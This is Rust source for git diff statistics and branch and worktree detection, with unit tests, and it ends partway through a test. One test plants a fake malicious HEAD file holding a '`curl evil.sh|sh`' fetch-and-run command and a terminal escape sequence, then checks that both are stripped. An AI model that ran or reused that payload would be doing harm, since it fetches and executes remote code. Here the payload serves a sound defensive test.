#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct GitDiffStats {
    pub files_changed: usize,
    pub insertions: usize,
    pub deletions: usize,
    pub count_capped: bool,
    pub unavailable: bool,
}

const REFTABLE_HEAD: &str = "ref: refs/heads/.invalid";

const GIT_DIFF_STAT_DEADLINE: std::time::Duration = std::time::Duration::from_secs(10);

const GIT_DIFF_STAT_STDOUT_CAP: u64 = 256 * 1024;

const EMPTY_TREE_SHA: &str = "4b825dc642cb6eb9a060e54bf8d69288fbee4904";
const GIT_DIFF_STAT_UNTRACKED_FILE_CAP: usize = 200;
const GIT_DIFF_STAT_UNTRACKED_PATH_CAP: usize = 1000;
const GIT_DIFF_STAT_FILE_BYTES_CAP: u64 = 512 * 1024;
const GIT_DIFF_STAT_TRACKED_FILE_CAP: usize = 200;
const GIT_DIFF_STAT_BLOB_STDOUT_CAP: u64 = 8 * 1024 * 1024;
const GIT_BINARY_SNIFF_BYTES: usize = 8000;
const GITLINK_MODE: u32 = 0o160000;

impl GitDiffStats {
    pub fn from_cwd(cwd: &str) -> Self {
        Self::from_cwd_until(cwd, std::time::Instant::now() + GIT_DIFF_STAT_DEADLINE)
    }

    fn from_cwd_until(cwd: &str, deadline: std::time::Instant) -> Self {
        let Some(remaining) = deadline.checked_duration_since(std::time::Instant::now()) else {
            return Self::unavailable();
        };
        let (toplevel, base) = match resolve_toplevel_and_head(std::path::Path::new(cwd), remaining)
        {
            Ok((toplevel, Some(sha))) => (toplevel, sha),
            Ok((toplevel, None)) => (toplevel, EMPTY_TREE_SHA.to_string()),
            Err(_) => return Self::unavailable(),
        };
        let Some(remaining) = deadline.checked_duration_since(std::time::Instant::now()) else {
            return Self::unavailable();
        };
        let Some((raw, truncated)) = git_stdout_head(
            cwd,
            &["diff-index", "--raw", "-z", &base, "--"],
            remaining,
            GIT_DIFF_STAT_STDOUT_CAP,
        ) else {
            return Self::unavailable();
        };
        let changes = parse_raw_changes(&raw, truncated);
        let mut stats = Self {
            count_capped: truncated,
            ..Self::default()
        };
        if !stats.add_tracked(cwd, &toplevel, &changes, deadline)
            || !stats.add_untracked(cwd, deadline)
        {
            return Self::unavailable();
        }
        stats
    }

    fn add_tracked(
        &mut self,
        cwd: &str,
        toplevel: &std::path::Path,
        changes: &[RawChange],
        deadline: std::time::Instant,
    ) -> bool {
        let measured = &changes[..changes.len().min(GIT_DIFF_STAT_TRACKED_FILE_CAP)];
        let Some(blobs) = read_blobs(cwd, measured, deadline) else {
            return false;
        };
        for (idx, change) in changes.iter().enumerate() {
            if change.status == b'U' {
                continue;
            }
            if idx >= GIT_DIFF_STAT_TRACKED_FILE_CAP || std::time::Instant::now() >= deadline {
                self.files_changed += 1;
                continue;
            }
            match (change.old_side(&blobs), change.new_side(toplevel, &blobs)) {
                (SideText::Text(old), SideText::Text(new)) => {
                    if change.status == b'M' && change.old_mode == change.new_mode && old == new {
                        continue;
                    }
                    let (added, removed) = git_line_counts(old, new);
                    self.files_changed += 1;
                    self.insertions += added as usize;
                    self.deletions += removed as usize;
                }
                _ => self.files_changed += 1,
            }
        }
        true
    }

    fn unavailable() -> Self {
        Self {
            unavailable: true,
            ..Self::default()
        }
    }

    pub fn or_previous(self, previous: &Self) -> Self {
        if self.unavailable {
            previous.clone()
        } else {
            self
        }
    }

    pub fn files_changed_label(&self) -> String {
        let plus = if self.count_capped { "+" } else { "" };
        let plural = if self.files_changed == 1 && !self.count_capped {
            ""
        } else {
            "s"
        };
        format!("{}{plus} file{plural}", self.files_changed)
    }

    pub fn is_empty(&self) -> bool {
        self.files_changed == 0 && self.insertions == 0 && self.deletions == 0
    }

    fn add_untracked(&mut self, cwd: &str, deadline: std::time::Instant) -> bool {
        let Some(remaining) = deadline.checked_duration_since(std::time::Instant::now()) else {
            return false;
        };
        let Some((out, truncated)) = git_stdout_head(
            cwd,
            &[
                "ls-files",
                "--others",
                "--exclude-standard",
                "-z",
                "--",
                ":/",
            ],
            remaining,
            GIT_DIFF_STAT_STDOUT_CAP,
        ) else {
            return false;
        };
        let mut records: Vec<&[u8]> = out.split(|byte| *byte == 0).collect();
        if truncated || !out.ends_with(&[0]) {
            records.pop();
        }
        let paths: Vec<String> = records
            .into_iter()
            .filter(|record| !record.is_empty())
            .map(|record| String::from_utf8_lossy(record).into_owned())
            .collect();
        self.count_capped |= truncated || paths.len() > GIT_DIFF_STAT_UNTRACKED_PATH_CAP;
        for (idx, path) in paths
            .iter()
            .take(GIT_DIFF_STAT_UNTRACKED_PATH_CAP)
            .enumerate()
        {
            self.files_changed += 1;
            if idx < GIT_DIFF_STAT_UNTRACKED_FILE_CAP && std::time::Instant::now() < deadline {
                self.insertions += untracked_insertions(cwd, path);
            }
        }
        true
    }
}

pub(crate) fn resolve_head(
    cwd: &std::path::Path,
    deadline: std::time::Duration,
) -> Result<Option<String>, String> {
    let mut cmd = crate::git_command::git(
        crate::git_command::GitProfile::Probe,
        ["rev-parse", "--verify", "--quiet", "HEAD^{commit}"],
    );
    cmd.current_dir(cwd);
    let output = crate::git_command::run(cmd, deadline, 4096)
        .map_err(|error| format!("git rev-parse HEAD failed: {error}"))?;
    let sha = String::from_utf8_lossy(&output.stdout).trim().to_string();
    match output.status.code() {
        Some(0) if !sha.is_empty() => Ok(Some(sha)),
        Some(1) if sha.is_empty() && head_is_unborn(cwd, deadline) => Ok(None),
        _ => Err(format!(
            "git could not read HEAD: {}",
            String::from_utf8_lossy(&output.stderr)
                .lines()
                .last()
                .unwrap_or("unknown error")
        )),
    }
}

fn head_is_unborn(cwd: &std::path::Path, deadline: std::time::Duration) -> bool {
    let mut cmd = crate::git_command::git(
        crate::git_command::GitProfile::Probe,
        ["symbolic-ref", "--quiet", "HEAD"],
    );
    cmd.current_dir(cwd);
    crate::git_command::run(cmd, deadline, 4096).is_ok_and(|out| out.status.success())
}

pub(crate) fn git_stdout_head(
    cwd: impl AsRef<std::path::Path>,
    args: &[&str],
    deadline: std::time::Duration,
    stdout_cap: u64,
) -> Option<(Vec<u8>, bool)> {
    let mut cmd = crate::git_command::git(crate::git_command::GitProfile::Probe, args);
    cmd.current_dir(cwd);
    let (output, truncated) =
        crate::git_command::run_keeping_stdout_head(cmd, deadline, stdout_cap).ok()?;
    (truncated || output.status.success()).then_some((output.stdout, truncated))
}

pub(crate) fn git_stdout(
    cwd: impl AsRef<std::path::Path>,
    args: &[&str],
    deadline: std::time::Duration,
    stdout_cap: u64,
) -> Option<Vec<u8>> {
    let mut cmd = crate::git_command::git(crate::git_command::GitProfile::Probe, args);
    cmd.current_dir(cwd);
    let output = crate::git_command::run(cmd, deadline, stdout_cap).ok()?;
    output.status.success().then_some(output.stdout)
}

fn resolve_toplevel_and_head(
    cwd: &std::path::Path,
    deadline: std::time::Duration,
) -> Result<(std::path::PathBuf, Option<String>), String> {
    let mut cmd = crate::git_command::git(
        crate::git_command::GitProfile::Probe,
        [
            "rev-parse",
            "--show-toplevel",
            "--verify",
            "--quiet",
            "HEAD^{commit}",
        ],
    );
    cmd.current_dir(cwd);
    let output = crate::git_command::run(cmd, deadline, 16 * 1024)
        .map_err(|error| format!("git rev-parse HEAD failed: {error}"))?;
    let mut lines = output
        .stdout
        .split(|byte| *byte == b'\n')
        .map(<[u8]>::trim_ascii_end);
    let toplevel = lines
        .next()
        .filter(|line| !line.is_empty())
        .map(path_from_git_output);
    let sha = lines
        .next()
        .map(|line| String::from_utf8_lossy(line).trim().to_string())
        .unwrap_or_default();
    match (toplevel, output.status.code()) {
        (Some(toplevel), Some(0)) if !sha.is_empty() => Ok((toplevel, Some(sha))),
        (Some(toplevel), Some(1)) if sha.is_empty() && head_is_unborn(cwd, deadline) => {
            Ok((toplevel, None))
        }
        _ => Err(format!(
            "git could not read HEAD: {}",
            String::from_utf8_lossy(&output.stderr)
                .lines()
                .last()
                .unwrap_or("unknown error")
        )),
    }
}

fn path_from_git_output(bytes: &[u8]) -> std::path::PathBuf {
    #[cfg(unix)]
    {
        use std::os::unix::ffi::OsStrExt;
        std::path::PathBuf::from(std::ffi::OsStr::from_bytes(bytes))
    }
    #[cfg(not(unix))]
    {
        std::path::PathBuf::from(String::from_utf8_lossy(bytes).into_owned())
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct RawChange {
    old_mode: u32,
    new_mode: u32,
    old_oid: String,
    new_oid: String,
    status: u8,
    path: Vec<u8>,
}

fn is_null_oid(oid: &str) -> bool {
    !oid.is_empty() && oid.bytes().all(|byte| byte == b'0')
}

fn subproject_line(oid: &str, dirty: bool) -> String {
    format!(
        "Subproject commit {oid}{}\n",
        if dirty { "-dirty" } else { "" }
    )
}

impl RawChange {
    fn stored_blobs(&self) -> impl Iterator<Item = &str> {
        [
            (self.old_mode, &self.old_oid),
            (self.new_mode, &self.new_oid),
        ]
        .into_iter()
        .filter(|(mode, oid)| *mode != 0 && *mode != GITLINK_MODE && !is_null_oid(oid))
        .map(|(_, oid)| oid.as_str())
    }

    fn old_side(&self, blobs: &std::collections::HashMap<String, SideText>) -> SideText {
        match self.old_mode {
            0 => SideText::Text(String::new()),
            GITLINK_MODE => SideText::Text(subproject_line(&self.old_oid, false)),
            _ => stored_side(blobs, &self.old_oid),
        }
    }

    fn new_side(
        &self,
        toplevel: &std::path::Path,
        blobs: &std::collections::HashMap<String, SideText>,
    ) -> SideText {
        match self.new_mode {
            0 => SideText::Text(String::new()),
            GITLINK_MODE if is_null_oid(&self.new_oid) => {
                SideText::Text(subproject_line(&self.old_oid, true))
            }
            GITLINK_MODE => SideText::Text(subproject_line(&self.new_oid, false)),
            _ if is_null_oid(&self.new_oid) => {
                read_worktree_text(&toplevel.join(path_from_git_output(&self.path)))
            }
            _ => stored_side(blobs, &self.new_oid),
        }
    }
}

const MISSING_FINAL_NEWLINE: char = '\u{FFFF}';

fn with_final_newline_marked(mut text: String) -> String {
    if !text.is_empty() && !text.ends_with('\n') {
        text.push(MISSING_FINAL_NEWLINE);
        text.push('\n');
    }
    text
}

fn git_line_counts(old: String, new: String) -> (u32, u32) {
    crate::diff::line_change_counts(
        &with_final_newline_marked(old),
        &with_final_newline_marked(new),
    )
}

fn stored_side(blobs: &std::collections::HashMap<String, SideText>, oid: &str) -> SideText {
    blobs.get(oid).cloned().unwrap_or(SideText::Unreadable)
}

fn parse_raw_changes(raw: &[u8], truncated: bool) -> Vec<RawChange> {
    let complete = if truncated {
        raw.iter()
            .rposition(|byte| *byte == 0)
            .map_or(&raw[..0], |last| &raw[..=last])
    } else {
        raw
    };
    let mut fields = complete
        .split(|byte| *byte == 0)
        .filter(|field| !field.is_empty());
    let mut changes = Vec::new();
    while let Some(header) = fields.next() {
        let Some(change) = parse_raw_header(header, &mut fields) else {
            break;
        };
        changes.push(change);
    }
    changes
}

fn parse_raw_header<'a>(
    header: &[u8],
    paths: &mut impl Iterator<Item = &'a [u8]>,
) -> Option<RawChange> {
    let header = std::str::from_utf8(header).ok()?.strip_prefix(':')?;
    let mut parts = header.split(' ');
    let old_mode = u32::from_str_radix(parts.next()?, 8).ok()?;
    let new_mode = u32::from_str_radix(parts.next()?, 8).ok()?;
    let old_oid = parts.next()?.to_string();
    let new_oid = parts.next()?.to_string();
    let status = *parts.next()?.as_bytes().first()?;
    let mut path = paths.next()?;
    if matches!(status, b'R' | b'C') {
        path = paths.next()?;
    }
    Some(RawChange {
        old_mode,
        new_mode,
        old_oid,
        new_oid,
        status,
        path: path.to_vec(),
    })
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum SideText {
    Text(String),
    Binary,
    TooLarge,
    Unreadable,
}

fn stat_text(bytes: Vec<u8>) -> SideText {
    if bytes[..bytes.len().min(GIT_BINARY_SNIFF_BYTES)].contains(&0) {
        return SideText::Binary;
    }
    let text = String::from_utf8(bytes)
        .unwrap_or_else(|error| String::from_utf8_lossy(error.as_bytes()).into_owned());
    SideText::Text(if text.contains("\r\n") {
        text.replace("\r\n", "\n")
    } else {
        text
    })
}

fn read_blobs(
    cwd: &str,
    changes: &[RawChange],
    deadline: std::time::Instant,
) -> Option<std::collections::HashMap<String, SideText>> {
    let mut wanted: Vec<&str> = changes.iter().flat_map(RawChange::stored_blobs).collect();
    wanted.sort_unstable();
    wanted.dedup();
    if wanted.is_empty() {
        return Some(std::collections::HashMap::new());
    }
    let remaining = deadline.checked_duration_since(std::time::Instant::now())?;
    let stdin: Vec<u8> = wanted
        .iter()
        .flat_map(|oid| oid.bytes().chain(std::iter::once(b'\n')))
        .collect();
    let mut cmd = crate::git_command::git(
        crate::git_command::GitProfile::Probe,
        ["cat-file", "--batch"],
    );
    cmd.current_dir(cwd);
    let (output, _) = crate::git_command::run_feeding_stdin_keeping_stdout_head(
        cmd,
        stdin,
        remaining,
        GIT_DIFF_STAT_BLOB_STDOUT_CAP,
    )
    .ok()?;
    output
        .status
        .success()
        .then(|| parse_blob_batch(&output.stdout))
}

fn parse_blob_batch(mut rest: &[u8]) -> std::collections::HashMap<String, SideText> {
    let mut blobs = std::collections::HashMap::new();
    while let Some(eol) = rest.iter().position(|byte| *byte == b'\n') {
        let header = String::from_utf8_lossy(&rest[..eol]).into_owned();
        rest = &rest[eol + 1..];
        let mut fields = header.split(' ');
        let (Some(oid), Some(kind)) = (fields.next(), fields.next()) else {
            break;
        };
        let Some(size) = fields.next().and_then(|size| size.parse::<usize>().ok()) else {
            blobs.insert(oid.to_string(), SideText::Unreadable);
            continue;
        };
        if rest.len() <= size {
            break;
        }
        let content = &rest[..size];
        rest = &rest[size + 1..];
        let side = if kind != "blob" {
            SideText::Unreadable
        } else if size as u64 > GIT_DIFF_STAT_FILE_BYTES_CAP {
            SideText::TooLarge
        } else {
            stat_text(content.to_vec())
        };
        blobs.insert(oid.to_string(), side);
    }
    blobs
}

fn read_worktree_text(path: &std::path::Path) -> SideText {
    use std::io::Read;

    match std::fs::symlink_metadata(path) {
        Ok(meta) if meta.file_type().is_symlink() => std::fs::read_link(path)
            .map(|target| SideText::Text(target.to_string_lossy().into_owned()))
            .unwrap_or(SideText::Unreadable),
        Ok(_) => {
            let Ok((file, _)) = paneflow_home::open_regular_for_reading(path) else {
                return SideText::Unreadable;
            };
            let mut bytes = Vec::new();
            if file
                .take(GIT_DIFF_STAT_FILE_BYTES_CAP + 1)
                .read_to_end(&mut bytes)
                .is_err()
            {
                return SideText::Unreadable;
            }
            if bytes.len() as u64 > GIT_DIFF_STAT_FILE_BYTES_CAP {
                return SideText::TooLarge;
            }
            stat_text(bytes)
        }
        Err(_) => SideText::Unreadable,
    }
}

fn untracked_insertions(cwd: &str, rel_path: &str) -> usize {
    match read_worktree_text(&std::path::Path::new(cwd).join(rel_path)) {
        SideText::Text(text) => text_line_count(&text),
        SideText::Binary | SideText::TooLarge | SideText::Unreadable => 0,
    }
}

fn text_line_count(text: &str) -> usize {
    if text.is_empty() {
        0
    } else {
        text.lines().count()
    }
}

pub(super) fn read_capped(path: &std::path::Path, limit: u64) -> std::io::Result<String> {
    use std::io::Read;
    let file = std::fs::File::open(path)?;
    let mut content = String::new();
    file.take(limit).read_to_string(&mut content)?;
    Ok(content)
}

pub fn find_git_dir(cwd: &str) -> Option<std::path::PathBuf> {
    let mut search_dir = std::path::Path::new(cwd);
    let git_path = loop {
        let candidate = search_dir.join(".git");
        if candidate.exists() {
            break candidate;
        }
        search_dir = search_dir.parent()?;
    };

    if git_path.is_file() {
        let content = read_capped(&git_path, 512).ok()?;
        let gitdir = content.trim().strip_prefix("gitdir: ")?.to_owned();
        let gitdir_path = if std::path::Path::new(&gitdir).is_absolute() {
            std::path::PathBuf::from(&gitdir)
        } else {
            git_path
                .parent()
                .unwrap_or(std::path::Path::new(cwd))
                .join(&gitdir)
        };
        Some(gitdir_path)
    } else if git_path.is_dir() {
        Some(git_path)
    } else {
        None
    }
}

fn canonicalize_or(path: &std::path::Path) -> std::path::PathBuf {
    crate::runtime_paths::strip_verbatim_prefix(
        std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf()),
    )
}

fn normalize_lexically(path: &std::path::Path) -> std::path::PathBuf {
    use std::path::Component;
    let mut stack: Vec<Component> = Vec::new();
    for comp in path.components() {
        match comp {
            Component::CurDir => {}
            Component::ParentDir => match stack.last() {
                Some(Component::Normal(_)) => {
                    stack.pop();
                }
                _ => stack.push(comp),
            },
            other => stack.push(other),
        }
    }
    let mut out = std::path::PathBuf::new();
    for comp in stack {
        out.push(comp.as_os_str());
    }
    out
}

pub fn resolve_main_git_dir(git_dir: &std::path::Path) -> Option<std::path::PathBuf> {
    let commondir_file = git_dir.join("commondir");
    let main_git_dir = if commondir_file.is_file() {
        let content = read_capped(&commondir_file, 512).ok()?;
        let rel = content.trim();
        if rel.is_empty() {
            return None;
        }
        let p = std::path::Path::new(rel);
        if p.is_absolute() {
            p.to_path_buf()
        } else {
            normalize_lexically(&git_dir.join(p))
        }
    } else {
        git_dir.to_path_buf()
    };
    Some(canonicalize_or(&main_git_dir))
}

pub fn resolve_repo_root(git_dir: &std::path::Path) -> (Option<std::path::PathBuf>, bool) {
    let is_worktree = git_dir.join("commondir").is_file();
    let repo_root = resolve_main_git_dir(git_dir)
        .and_then(|main_git| main_git.parent().map(|p| p.to_path_buf()));
    (repo_root, is_worktree)
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct GitLocation {
    pub git_dir: Option<std::path::PathBuf>,
    pub repo_root: Option<std::path::PathBuf>,
    pub worktree_root: std::path::PathBuf,
}

impl GitLocation {
    pub fn unprobed(cwd: &str) -> Self {
        Self {
            git_dir: None,
            repo_root: None,
            worktree_root: std::path::PathBuf::from(cwd),
        }
    }

    pub fn probe(cwd: &str) -> Self {
        let git_dir = find_git_dir(cwd);
        let (repo_root, is_worktree) = git_dir.as_deref().map_or((None, false), resolve_repo_root);
        let worktree_root =
            resolve_worktree_root(cwd, git_dir.as_deref(), repo_root.as_deref(), is_worktree);
        Self {
            git_dir,
            repo_root,
            worktree_root,
        }
    }
}

pub fn resolve_worktree_root(
    cwd: &str,
    git_dir: Option<&std::path::Path>,
    repo_root: Option<&std::path::Path>,
    is_worktree: bool,
) -> std::path::PathBuf {
    if !is_worktree {
        return repo_root
            .map(std::path::Path::to_path_buf)
            .unwrap_or_else(|| std::path::PathBuf::from(cwd));
    }

    let Some(git_dir) = git_dir else {
        return std::path::PathBuf::from(cwd);
    };
    let content = read_capped(&git_dir.join("gitdir"), 512).ok();
    let Some(raw) = content.as_deref().map(str::trim).filter(|s| !s.is_empty()) else {
        return std::path::PathBuf::from(cwd);
    };
    let git_file = std::path::Path::new(raw);
    let git_file = if git_file.is_absolute() {
        git_file.to_path_buf()
    } else {
        normalize_lexically(&git_dir.join(git_file))
    };
    git_file
        .parent()
        .map(canonicalize_or)
        .unwrap_or_else(|| std::path::PathBuf::from(cwd))
}

pub(super) fn parse_head(git_dir: &std::path::Path) -> (String, bool) {
    let head_path = git_dir.join("HEAD");
    let content = match read_capped(&head_path, 512) {
        Ok(c) => c,
        Err(_) => return (String::new(), true),
    };
    let content = content.trim();

    if content == REFTABLE_HEAD {
        (String::new(), true)
    } else if let Some(branch) = content.strip_prefix("ref: refs/heads/") {
        (branch.chars().filter(|c| !c.is_control()).collect(), true)
    } else if content.chars().all(|c| c.is_ascii_hexdigit())
        && (content.len() == 40 || content.len() == 64)
    {
        let short = &content[..7];
        (format!("({short})"), true)
    } else {
        (String::new(), true)
    }
}

pub fn detect_branch(cwd: &str) -> (String, bool) {
    match find_git_dir(cwd) {
        Some(git_dir) if uses_reftable(&git_dir) => (branch_from_git(cwd), true),
        Some(git_dir) => parse_head(&git_dir),
        None => (String::new(), false),
    }
}

fn uses_reftable(git_dir: &std::path::Path) -> bool {
    read_capped(&git_dir.join("HEAD"), 512).is_ok_and(|head| head.trim() == REFTABLE_HEAD)
}

fn branch_from_git(cwd: &str) -> String {
    let deadline = std::time::Duration::from_secs(5);
    if let Some(branch) = git_stdout(
        cwd,
        &["symbolic-ref", "--quiet", "--short", "HEAD"],
        deadline,
        4096,
    )
    .map(|out| String::from_utf8_lossy(&out).trim().to_string())
    .filter(|branch| !branch.is_empty())
    {
        return branch.chars().filter(|c| !c.is_control()).collect();
    }
    git_stdout(cwd, &["rev-parse", "--short=7", "HEAD"], deadline, 4096)
        .map(|out| String::from_utf8_lossy(&out).trim().to_string())
        .filter(|sha| !sha.is_empty())
        .map(|sha| format!("({sha})"))
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::git_fixture as fixture;

    fn canonical_expectation(path: &std::path::Path) -> std::path::PathBuf {
        crate::runtime_paths::strip_verbatim_prefix(std::fs::canonicalize(path).unwrap())
    }

    #[test]
    fn detect_branch_normal_branch() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/main\n").unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "main");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_feature_branch() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "ref: refs/heads/feature/JIRA-123-oauth\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "feature/JIRA-123-oauth");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_detached_head() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "96fa6899ea34697257e84865fefc56beb42d6390\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "(96fa689)");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_not_a_git_repo() {
        let dir = tempfile::tempdir().unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert_eq!(branch, "");
        assert!(!is_repo);
    }

    #[test]
    fn detect_branch_worktree_file() {
        let dir = tempfile::tempdir().unwrap();
        let worktree_git_dir = dir.path().join("worktree_git");
        std::fs::create_dir(&worktree_git_dir).unwrap();
        std::fs::write(worktree_git_dir.join("HEAD"), "ref: refs/heads/wt-branch\n").unwrap();

        let work_dir = dir.path().join("work");
        std::fs::create_dir(&work_dir).unwrap();
        std::fs::write(
            work_dir.join(".git"),
            format!("gitdir: {}\n", worktree_git_dir.display()),
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(work_dir.to_str().unwrap());
        assert_eq!(branch, "wt-branch");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_nonexistent_directory() {
        let (branch, is_repo) = detect_branch("/nonexistent/path/that/does/not/exist");
        assert_eq!(branch, "");
        assert!(!is_repo);
    }

    #[test]
    fn detect_branch_worktree_relative_path() {
        let dir = tempfile::tempdir().unwrap();
        let worktree_git_dir = dir
            .path()
            .join("main_repo")
            .join(".git")
            .join("worktrees")
            .join("wt1");
        std::fs::create_dir_all(&worktree_git_dir).unwrap();
        std::fs::write(
            worktree_git_dir.join("HEAD"),
            "ref: refs/heads/relative-wt\n",
        )
        .unwrap();

        let work_dir = dir.path().join("wt1");
        std::fs::create_dir(&work_dir).unwrap();
        std::fs::write(
            work_dir.join(".git"),
            "gitdir: ../main_repo/.git/worktrees/wt1\n",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(work_dir.to_str().unwrap());
        assert_eq!(branch, "relative-wt");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_subdirectory_of_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/develop\n").unwrap();

        let sub_dir = dir.path().join("src").join("module");
        std::fs::create_dir_all(&sub_dir).unwrap();

        let (branch, is_repo) = detect_branch(sub_dir.to_str().unwrap());
        assert_eq!(branch, "develop");
        assert!(is_repo);
    }

    #[test]
    fn detect_branch_strips_control_chars_from_malicious_head() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("HEAD"),
            "ref: refs/heads/main\n`curl evil.sh|sh`\n\x1b]0;spoof\x07",
        )
        .unwrap();

        let (branch, is_repo) = detect_branch(dir.path().to_str().unwrap());
        assert!(is_repo);
        assert!(!branch.contains('\n'), "newline must be stripped");
        assert!(!branch.contains('\r'), "carriage return must be stripped");
        assert!(!branch.contains('\x1b'), "ESC must be stripped");
        assert!(branch.chars().all(|c| !c.is_control()));
        assert!(branch.starts_with("main"));
    }

    #[test]
    fn find_git_dir_normal_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let result = find_git_dir(dir.path().to_str().unwrap());
        assert_eq!(result, Some(git_dir));
    }

    #[test]
    fn find_git_dir_not_a_repo() {
        let dir = tempfile::tempdir().unwrap();
        let result = find_git_dir(dir.path().to_str().unwrap());
        assert_eq!(result, None);
    }

    #[test]
    fn find_git_dir_worktree() {
        let dir = tempfile::tempdir().unwrap();
        let worktree_git_dir = dir
            .path()
            .join("main_repo")
            .join(".git")
            .join("worktrees")
            .join("wt1");
        std::fs::create_dir_all(&worktree_git_dir).unwrap();

        let work_dir = dir.path().join("wt1");
        std::fs::create_dir(&work_dir).unwrap();
        std::fs::write(
            work_dir.join(".git"),
            format!("gitdir: {}\n", worktree_git_dir.display()),
        )
        .unwrap();

        let result = find_git_dir(work_dir.to_str().unwrap());
        assert_eq!(result, Some(worktree_git_dir));
    }

    #[test]
    fn find_git_dir_subdirectory() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let sub_dir = dir.path().join("src").join("lib");
        std::fs::create_dir_all(&sub_dir).unwrap();

        let result = find_git_dir(sub_dir.to_str().unwrap());
        assert_eq!(result, Some(git_dir));
    }

    #[test]
    fn resolve_repo_root_normal_repo() {
        let dir = tempfile::tempdir().unwrap();
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&git_dir);
        assert!(!is_worktree);
        assert_eq!(repo_root, Some(canonical_expectation(dir.path())));
    }

    #[test]
    fn resolve_repo_root_worktree_relative_commondir() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        let wt_git = main_git.join("worktrees").join("wt1");
        std::fs::create_dir_all(&wt_git).unwrap();
        std::fs::write(wt_git.join("commondir"), "../..\n").unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&wt_git);
        assert!(is_worktree);
        assert_eq!(
            repo_root,
            Some(canonical_expectation(&dir.path().join("main")))
        );
    }

    #[test]
    fn resolve_repo_root_worktree_absolute_commondir() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        let wt_git = main_git.join("worktrees").join("wt2");
        std::fs::create_dir_all(&wt_git).unwrap();
        std::fs::write(
            wt_git.join("commondir"),
            format!("{}\n", main_git.display()),
        )
        .unwrap();

        let (repo_root, is_worktree) = resolve_repo_root(&wt_git);
        assert!(is_worktree);
        assert_eq!(
            repo_root,
            Some(canonical_expectation(&dir.path().join("main")))
        );
    }

    #[test]
    fn resolve_worktree_root_uses_stored_gitdir_pointer() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        let worktree_root = dir.path().join("repo.worktrees").join("feat");
        let worktree_subdir = worktree_root.join("src");
        let wt_git = main_git.join("worktrees").join("feat");
        std::fs::create_dir_all(&worktree_subdir).unwrap();
        std::fs::create_dir_all(&wt_git).unwrap();
        std::fs::write(
            wt_git.join("gitdir"),
            format!("{}\n", worktree_root.join(".git").display()),
        )
        .unwrap();

        let root = resolve_worktree_root(
            worktree_subdir.to_str().unwrap(),
            Some(&wt_git),
            Some(&dir.path().join("main")),
            true,
        );

        assert_eq!(root, canonical_expectation(&worktree_root));
    }

    #[test]
    fn resolve_repo_root_siblings_match() {
        let dir = tempfile::tempdir().unwrap();
        let main_git = dir.path().join("main").join(".git");
        std::fs::create_dir_all(&main_git).unwrap();
        let wt_a = main_git.join("worktrees").join("a");
        let wt_b = main_git.join("worktrees").join("b");
        std::fs::create_dir_all(&wt_a).unwrap();
        std::fs::create_dir_all(&wt_b).unwrap();
        std::fs::write(wt_a.join("commondir"), "../..\n").unwrap();
        std::fs::write(wt_b.join("commondir"), "../..\n").unwrap();

        let (root_a, _) = resolve_repo_root(&wt_a);
        let (root_b, _) = resolve_repo_root(&wt_b);
        assert!(root_a.is_some());
        assert_eq!(root_a, root_b);
    }

    #[test]
    fn normalize_lexically_collapses_dotdot() {
        let wt_git = std::path::Path::new("/nonexistent/main/.git/worktrees/wt1");
        assert_eq!(
            normalize_lexically(&wt_git.join("../..")),
            std::path::PathBuf::from("/nonexistent/main/.git")
        );
        assert_eq!(
            normalize_lexically(std::path::Path::new("../foo/./bar")),
            std::path::PathBuf::from("../foo/bar")
        );
    }

    #[test]
    fn resolve_repo_root_missing_dir() {
        let (repo_root, is_worktree) = resolve_repo_root(std::path::Path::new("/nonexistent/.git"));
        assert!(!is_worktree);
        assert_eq!(repo_root, Some(std::path::PathBuf::from("/nonexistent")));
    }

    #[test]
    fn from_cwd_on_non_repo_yields_unavailable_default() {
        let dir = tempfile::tempdir().unwrap();
